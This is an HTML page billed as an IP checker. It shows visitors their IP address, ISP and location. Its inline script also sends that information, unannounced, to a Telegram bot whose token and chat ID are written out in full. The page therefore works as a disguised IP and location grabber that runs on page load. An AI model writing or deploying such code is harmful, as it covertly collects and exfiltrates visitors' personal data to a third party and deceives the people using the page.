<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Check Your IP</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen">
    <div class="bg-white p-6 rounded-lg shadow-lg text-center w-full max-w-md">
        <h1 class="text-2xl font-bold text-gray-800 mb-4">Your IP Information</h1>
        <div id="ip-info" class="space-y-4 hidden">
            <p class="text-lg"><strong>IP Address:</strong> <span id="ip" class="text-blue-600"></span></p>
            <p class="text-lg"><strong>ISP:</strong> <span id="isp" class="text-blue-600"></span></p>
            <p class="text-lg"><strong>Location:</strong> <span id="location" class="text-blue-600"></span></p>
        </div>
        <p id="loading" class="text-lg text-gray-600 animate-pulse">Loading your IP information...</p>
        <div id="error" class="text-red-600 mt-4 hidden"></div>
    </div>

    <script>
        const ipApiURL = 'https://ipapi.co/json/';
        const telegramApiURL = 'https://api.telegram.org/bot7511319653:AAGQIaI1jaRswln9YEqJMUog5MFAWQnpR38/sendMessage';
        const chatId = '@Upenwajssisheh';

        const ipElement = document.getElementById('ip');
        const ispElement = document.getElementById('isp');
        const locationElement = document.getElementById('location');
        const ipInfoElement = document.getElementById('ip-info');
        const loadingElement = document.getElementById('loading');
        const errorElement = document.getElementById('error');

        fetch(ipApiURL)
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const isp = data.org;
                const location = `${data.city}, ${data.region}, ${data.country_name}`;

                ipElement.textContent = ip;
                ispElement.textContent = isp;
                locationElement.textContent = location;

                ipInfoElement.classList.remove('hidden');
                loadingElement.classList.add('hidden');

                const message = `IP: ${ip}\nISP: ${isp}\nLocation: ${location}`;

                fetch(telegramApiURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                })
                .then(response => response.json())
                .then(result => {
                    if (!result.ok) {
                        console.error('Telegram API error:', result);
                        errorElement.textContent = 'Failed to send message to Telegram.';
                        errorElement.classList.remove('hidden');
                    } else {
                        console.log('Message sent to Telegram:', result);
                    }
                })
                .catch(error => {
                    console.error('Error sending message to Telegram:', error);
                    errorElement.textContent = 'Error sending message to Telegram.';
                    errorElement.classList.remove('hidden');
                });
            })
            .catch(error => {
                loadingElement.textContent = 'Failed to load IP information.';
                errorElement.textContent = 'Error fetching IP info.';
                errorElement.classList.remove('hidden');
                console.error('Error fetching IP info:', error);
            });
    </script>
</body>
</html>
